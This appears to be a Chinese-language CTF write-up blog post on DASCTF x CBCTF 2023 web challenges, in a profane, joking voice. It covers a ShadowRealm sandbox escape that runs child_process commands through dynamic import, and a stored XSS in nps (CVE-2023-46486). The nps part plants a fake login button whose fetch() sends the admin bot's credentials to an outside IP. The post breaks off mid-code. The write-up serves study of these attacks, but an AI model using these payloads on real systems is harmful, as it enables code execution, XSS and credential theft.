<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#3367D6"/>
  <link rel="apple-touch-icon" href="/icons-192.png">
  <link rel="manifest" href="/manifest.json">
  
  <meta name="generator" content="Hexo 6.0.0">

  

  

  
    <meta name="author" content="1llustrious">
  

  

  

  <title>Hexo</title>

  

  
    <link rel="shortcut icon" href="/favicon.ico">
  

  <!--mathjax latexæ•°å­¦å…¬å¼æ˜¾ç¤ºæ”¯æŒ-->
  
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
  

  

  
<link rel="stylesheet" href="/css/style.css">

</head>
<body>
  <div class="root-container">
    
<!-- header container -->
<header class="header-container post">
  
    <div class="post-image" style="background-image: url(https://raw.githubusercontent.com/1llustrious/img/main/background2.jpg)"></div>
  

  <!-- navbar -->
<nav class="navbar">
  <div class="navbar-content">
    <!-- logo -->
    <div class="navbar-logo">
      <a href="/">
        
          Hexo
        
      </a>
    </div>
    <!-- link -->
    <div class="navbar-link">
      <div class="navbar-btn">
        <div></div>
        <div></div>
        <div></div>
      </div>
      <ul class="navbar-list">
        
          <li class="navbar-list-item"><a href="/">é¦–é¡µ</a></li>
        
          <li class="navbar-list-item"><a href="/links">å‹é“¾</a></li>
        
          <li class="navbar-list-item"><a href="/about">å…³äº</a></li>
        
      </ul>
    </div>
  </div>
</nav>

  
  

  
  

  
  

  
  

  
  
    <div class="header-content">
      <div class="post-text layout-block">
        <div class="layout-margin">
          <h1 class="title-wrap"></h1>
          <h2 class="title-sub-wrap">
            <strong>1llustrious</strong>
            <span>å‘å¸ƒäº</span>
            <time  class="article-date" datetime="2023-11-30T02:14:38.947Z" itemprop="datePublished">2023-11-30</time>
          </h2>
          
          
          <ul class="wrap-list dark">
  
</ul>
          <ul class="wrap-list dark">
  
</ul>
        </div>
      </div>
    </div>
  

  
  
  
</header>

    <!-- æ–‡ç«  -->

<!-- æ–‡ç« å†…å®¹ -->
<div class="body-container">
  <article class="content-container layout-block post-container">
    <div class="article-info">
      
      
      
      
      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
        <hr>
<h2 id="DAS0RAYSxCBCTFå¤ç°"><a href="#DAS0RAYSxCBCTFå¤ç°" class="headerlink" title="DAS0RAYSxCBCTFå¤ç°"></a>DAS0RAYSxCBCTFå¤ç°</h2><h1 id="DAS0RAYSxCBCTF"><a href="#DAS0RAYSxCBCTF" class="headerlink" title="DAS0RAYSxCBCTF"></a>DAS0RAYSxCBCTF</h1><h1 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h1><p>wcsnmd,è°ç»™ğŸ‘´å‡ºçš„è¿™ä¹ˆæ¶å¿ƒçš„web,nmdçˆ†é›¶äº†,tmdæ€»å…±3100çš„è§£,ä»€ä¹ˆâˆšâ‘§ç©æ„å„¿.</p>
<p>wp:<a target="_blank" rel="noopener" href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">â€Œâ€ï»¿â¡ï»¿â£â€Œâ€ï»¿â€â£â¢â¢ï»¿â€Œâ€â€¬ï»¿â£ï»¿â€Œâ£â¢â€Œâ¡â¤â¢â¤â¤â€Œâ€Œâ¡â¢â€Œâ€ï»¿â£â€Œâ€Œâ¡â£ï»¿ï»¿DASCTF x CBCTF - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
<h1 id="yet-another-box"><a href="#yet-another-box" class="headerlink" title="yet another box"></a>yet another box</h1><p>è¿™é¢˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ²™ç®±<code>shadowrealm</code>,è¿™bydå’Œnodeçš„vm8å¤ªä¸€æ ·,æœ‰ç€è‡ªå·±çš„å…¨å±€å¯¹è±¡å’Œå†…ç½®å‡½æ•°,å°±æŒºæŠ½è±¡,æ²¡æ³•åƒ<code>vm</code>,ä¹Ÿæ— æ³•é€šè¿‡<code>prototype pollution</code>æ§åˆ¶ä¸»æ¨¡å—ä¸­çš„å†…ç½®å±æ€§å¦å¤–ç”±äºä¸ package.json å£°æ˜äº† â€œtypeâ€:â€moduleâ€ ä¸”æ–‡ä»¶ç»“å°¾ä¸º .mjsï¼Œæ‰€é‡‡ç”¨çš„ESM é»˜è®¤strict modeï¼Œæ— æ³•é€šè¿‡ [stack-trace-api](<a target="_blank" rel="noopener" href="https://v8.dev/docs/stack-trace-api#customizing-stack-traces">Stack trace API Â· V8 â€” å †æ ˆè·Ÿè¸ª API Â·V8å‘åŠ¨æœº</a>) è·¨ä¸Šä¸‹æ–‡å–å¾—å¯åˆ©ç”¨å¯¹è±¡ã€‚</p>
<h2 id="Stack-trace-API"><a href="#Stack-trace-API" class="headerlink" title="Stack trace API"></a>Stack trace API</h2><p>ä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨,å¹¶ä¸ä¸ºæœ¬é¢˜æä¾›æ€è·¯.</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒV8 æŠ›å‡ºçš„å‡ ä¹æ‰€æœ‰é”™è¯¯éƒ½æœ‰ä¸€ä¸ªå±æ€§,æŠ›å‡ºé”™è¯¯çš„æ—¶å€™ä¼šç”¨åˆ°æ–¹æ³•,è¯¥æ–¹æ³•èƒ½è·å¾—åˆ°å¤–é¢çš„å…¨å±€å¯¹è±¡.</p>
<h2 id="Shadow-Realm-API"><a href="#Shadow-Realm-API" class="headerlink" title="Shadow-Realm-API"></a>Shadow-Realm-API</h2><p><code>Wrapped Function Exotic Objects</code>æ˜¯ä¸€ç§å¥‡å¼‚å¯¹è±¡,å†…å«ä¸€ä¸ªå›è°ƒå‡½æ•°.å…·æœ‰ä¸€äº›å†…ç½®æ§½<code>slot</code>,:</p>
<table>
<thead>
<tr>
<th align="center">Internal slots</th>
<th align="center">Type</th>
<th align="center"><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">[[WrappedTargetFunction]]</td>
<td align="center">Callable Object</td>
<td align="center">Stores the callable object.</td>
</tr>
<tr>
<td align="center">[[Call]]</td>
<td align="center">The [[Call]] internal method</td>
<td align="center">Executes code associated with this objectâ€™s [[WrappedTargetFunction]].</td>
</tr>
<tr>
<td align="center">[[Realm]]</td>
<td align="center"><a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm-record"> Realm Record</a></td>
<td align="center">The <a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm">realm</a> in which the function was created.</td>
</tr>
</tbody></table>
<p>è¿˜æœ‰[[Prototype]] and [[Extensible]]</p>
<p>å¯¹è±¡çš„[[call]]æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°:thisArgument, argumentsList .è°ƒç”¨æ—¶ä¼šå®ç°ä»¥ä¸‹æ­¥éª¤:</p>
<p>1.è®¾ç½®è¿è¡Œä»£ç çš„ä¸Šä¸‹æ–‡.æ‰§è¡Œä¸Šä¸‹æ–‡é€šå¸¸åŒ…æ‹¬æ‰§è¡Œå‡½æ•°çš„ä½œç”¨åŸŸã€å˜é‡ã€this å€¼ç­‰ä¿¡æ¯ã€‚</p>
<p>2.è®¾ç½®æ–°çš„ä½œç”¨åŸŸcalleecontext.</p>
<p>3.æ‰§è¡Œassertæ–­è¨€,ç¡®ä¿calleecontextæ˜¯ç›®å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡.</p>
<p>4.ç”¨resultå‚¨å­˜**OrdinaryWrappedFunctionCall(F, thisArgument, argumentsList)**çš„è¿è¡Œç»“æœ</p>
<p>5.calleeContext è¢«ä»æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆä¸­ç§»é™¤ï¼Œè€Œ callerContext è¢«æ¢å¤ä¸ºå½“å‰è¿è¡Œçš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</p>
<p>6.åˆ¤æ–­è¿”å›ç±»å‹,å¦‚æœ[[TYPE]]å·²è¿”å›,åˆ™è¿”å›value.</p>
<p>7.å¤„ç†å¼‚å¸¸</p>
<p>8.æ‰§è¡Œç»“æŸ.</p>
<h2 id="dynamic-importæ–¹æ¡ˆ"><a href="#dynamic-importæ–¹æ¡ˆ" class="headerlink" title="dynamic importæ–¹æ¡ˆ"></a>dynamic importæ–¹æ¡ˆ</h2><p>é€šè¿‡åŠ¨æ€ import å…è®¸æˆ‘ä»¬æŒ‰éœ€åŠ è½½ JavaScript æ¨¡å—ï¼Œè€Œä¸ä¼šåœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å°†å…¨éƒ¨æ¨¡å—åŠ è½½ã€‚</p>
<p>åŠ¨æ€ import è¿”å›äº†ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥åœ¨ then ä¸­ç­‰æ¨¡å—åŠ è½½æˆåŠŸåå»åšä¸€äº›æ“ä½œã€‚</p>
<p>æ‰€ä»¥importå¯¼å…¥éœ€è¦é€šè¿‡thenå»è§¦å‘å…¶æ–¹æ³•.</p>
<p>importåœ¨æ‰§è¡Œæ–¹æ³•åä»ç„¶æ˜¯promiseå¯¹è±¡,é‡‡ç”¨çš„ç±»ä¼¼äºé“¾å¼è°ƒç”¨.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var test = <span class="keyword">import</span>(<span class="string">&quot;child_process&quot;</span>).then(m=&gt;console.log(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­testè·å–promiseå¼‚æ­¥å¯¹è±¡,è€Œmç›´æ¥å°±è·å¾—child_processå¯¹è±¡.</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ç®€è€Œè¨€ä¹‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts</span><br></pre></td></tr></table></figure>

<p>æ”¯æŒdynamic import</p>
<p>â€œDynamic importâ€ æ˜¯æŒ‡åœ¨ JavaScript ä¸­åŠ¨æ€åŠ è½½æ¨¡å—æˆ–æ–‡ä»¶çš„èƒ½åŠ›ã€‚è¿™æ˜¯ ECMAScript 2020 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¼•å…¥äº† import() å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚è¿™ä¸ä¼ ç»Ÿçš„é™æ€ import è¯­å¥ä¸åŒï¼Œåè€…åœ¨ä»£ç åŠ è½½æ—¶å³ç¡®å®šäº†è¦å¯¼å…¥çš„æ¨¡å—ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;child_process&#x27;</span>).then(m=&gt;m.execSync(<span class="string">&#x27;/readflag &gt; /app/asserts/flag&#x27;</span>));</span><br><span class="line"><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h1 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h1><p>mdåˆæ˜¯xss,ğŸ‘´åˆtnndä¸ä¼š,ã—ã­ï¼</p>
<p> ğŸ§€ä¸€ä¸ªnpsç½‘ç«™ä¸Šçš„xss.æ¶‰åŠ<a target="_blank" rel="noopener" href="https://blog.carrot2.cn/2023/10/nps2.html">CVE-2023-46486</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">é¡¹ç›®åœ°å€</a></p>
<p>å½±å“èŒƒå›´:</p>
<p>nps&lt;&#x3D;V0.26.10</p>
<p>ä½ tmæè¿™æ”¾å±å‘¢,æœ€æ–°ç‰ˆæœ¬å°±æ˜¯è¿™ä¸ª,21å¹´æœ€åpublishäº†.</p>
<p>æ¼æ´æ€ä¹ˆä¸ªäº‹:</p>
<p><code>bootstrapTable</code>å¹¶æœªé…ç½®<code>escape</code>å­—æ®µ,ä¸”ä½¿ç”¨æ—¶ä¸æ”¹é»˜è®¤é…ç½®</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231101223246.png" alt="å¾®ä¿¡æˆªå›¾_20231101223246"></p>
<p>kokodayo,web&#x2F;views&#x2F;client&#x2F;list.html</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231101223529.png" alt="å¾®ä¿¡æˆªå›¾_20231101223529"></p>
<p>è¿™é‡Œè®¾ç½®å…¬é’¥,é˜²æ­¢è¢«ntr(è¢«åˆ«äººç”¨ä»£ç†),ä½ ä¹Ÿä¸å¸Œæœ›ä½ æ‹¿ä¸åˆ°shellå§(bushi)</p>
<p>åŒä¸ºä»£ç†,ç»å¸¸è¢«æèµ·çš„frpå’Œvenoméƒ½æ²¡å¤ªæ³¨æ„å…¬é’¥,å®é™…ä¸Šæ˜¯æœ‰å…¬é’¥è¿™ä¸€é€‰é¡¹çš„.</p>
<p>è¿™é‡Œ,æˆ‘ä»¬å®Œå…¨å°±èƒ½å¤Ÿé€šè¿‡å®¢æˆ·ç«¯å»è¿›è¡Œæ”»å‡»äº†.</p>
<h2 id="å¼€æ‰“ğŸ˜“"><a href="#å¼€æ‰“ğŸ˜“" class="headerlink" title="å¼€æ‰“ğŸ˜“"></a>å¼€æ‰“ğŸ˜“</h2><p>cnm,sbwindows,æ­»æ´»ç”¨ä¸æˆ,linuxä¸€ä¸‹å°±å‡ºæ¥äº†å’ŒğŸ‘´ğŸ˜¡äº†</p>
<p>âˆšâ‘§ç©æ„,å½“ğŸ‘´â­ğŸ˜¡å§</p>
<p>é¦–å…ˆä¸‹è½½å®¢æˆ·ç«¯,è¿™ä¸€ç‚¹å’Œfrpçš„adminç«¯å’Œagentç«¯ç±»ä¼¼</p>
<p>ç„¶åé…ç½®å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231101224733.png" alt="å¾®ä¿¡æˆªå›¾_20231101224733"></p>
<p>Ã—æˆåŠŸäº†,ç‹ ç‹ åœ°Ã—è¿›å»</p>
<h2 id="remoteå¹²ğŸ¤ª"><a href="#remoteå¹²ğŸ¤ª" class="headerlink" title="remoteå¹²ğŸ¤ª"></a>remoteå¹²ğŸ¤ª</h2><h3 id="å¿†-æ‚Ÿ-è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ "><a href="#å¿†-æ‚Ÿ-è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ " class="headerlink" title="å¿†!æ‚Ÿ!è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ "></a>å¿†!æ‚Ÿ!è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ </h3><p>é¦–å…ˆé¢˜ç›®é€šè¿‡jsä»£ç é€ äº†ä¸ªåå°æœºå™¨äºº,ğŸ‘´å¾ˆå–œæ¬¢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;chromium, errors&#125; <span class="keyword">from</span> <span class="string">&quot;playwright-chromium&quot;</span>;</span><br><span class="line"></span><br><span class="line">const PASSWORD = <span class="string">&quot;DASCTF_flag&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸æ‡‚æ²¡å…³ç³»,ğŸ‘´æ¥å¸¦ä½ åˆ†æä¸€ä¸‹.</p>
<p>é¦–å…ˆæ•´ä¸ªå°±æ˜¯ä¸€å¨shitâ›°,</p>
<p>é€šè¿‡ä¸€ä¸ªç®­å¤´å‡½æ•°()çš„æ–¹å¼ç«‹å³è°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨å’Œä¸Šä¸‹æ–‡,ç„¶åè®¾ç½®setIneterval,è¡¨ç¤ºæ¯ä¸‰åç§’è°ƒç”¨visit,å‡½æ•°,è®©ğŸ‘´çœ‹çœ‹visitå‡½æ•°æ€ä¹ˆä¸ªäº‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè·å–æ–°é¡µé¢,ç„¶åè®¿é—®ä¸‰æ¬¡<code>http://a.o.com:8080/client/list</code></p>
<p>ä½ çœ‹çœ‹çœ¼ç†Ÿä¸,&#x2F;client&#x2F;liståˆšå¥½å°±æ˜¯åˆšæ‰å±•ç¤ºxssçš„è·¯å¾„,ä½ å“,ä½ ç»†å“.è¿™ä¸ªhostçœ¼ç†Ÿä¸,è¿™å¯æ˜¯åœ¨dockeré‡Œé¢è®¾ç½®çš„åœ°å€æ˜ å°„å•Š.</p>
<p>ãªã‚‰ã°ã€€ç­”ãˆã¯ã²ã¨ã¤ã </p>
<p>å°±æ˜¯xss,æ¥ä¸‹æ¥å°±æ˜¯åˆ†æè¿™ä¸ªæœºå™¨äººäº‹æ€ä¹ˆæ“ä½œçš„äº†.</p>
<p>é¦–å…ˆè¦çœ‹æœ‰æ— <code>button[langtag=&quot;word-login&quot;]</code>è¿™ç©æ„</p>
<p>é‚£æˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸€ä¸ªbuttonäº†,ä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¸‹ç‚¹æ¯’</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtang=&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>$(â€˜#usernameâ€™) æ˜¯ä¸€ä¸ª jQuery é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹©å…·æœ‰æŒ‡å®š id å±æ€§çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸­ï¼Œ#username è¡¨ç¤ºè¦é€‰æ‹© id ä¸º â€œusernameâ€ çš„å…ƒç´ ã€‚ä¼šä»è¾“å…¥è·å–</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;flag&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†æ ¹æ®è¿™ä¸ª</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br></pre></td></tr></table></figure>

<p>è®©æœºå™¨äººå»è¾“å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç™»å½•æ¡†,ä»è€Œé€šè¿‡inputè·å–åˆ°flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æ­¤,åœˆå¥—å·²è®¾,åªç­‰æ•Œå†›è¿›å…¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form <span class="keyword">class</span>=<span class="string">&quot;m-t&quot;</span> onsubmit=<span class="string">&quot;return false&quot;</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span 